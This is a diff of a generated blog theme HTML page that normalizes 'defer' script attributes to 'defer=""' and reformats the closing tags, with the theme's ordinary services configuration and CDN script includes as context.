@@ -771,7 +784,7 @@
 
 
 
-<script defer>
+<script defer="">
   window.addEventListener('DOMContentLoaded', (event) => {
     ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
     for (let id of Object.keys(ctx.services)) {
@@ -907,7 +920,7 @@
     hoverDelay: 25
   };
 </script>
-<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+<script defer="" src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
   ctx.fancybox = {
     selector: `.timenode p>img`,
     css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
@@ -986,4 +999,5 @@
 
 <!-- inject -->
 
-</div></body></html>
+</div>
+</body></html>
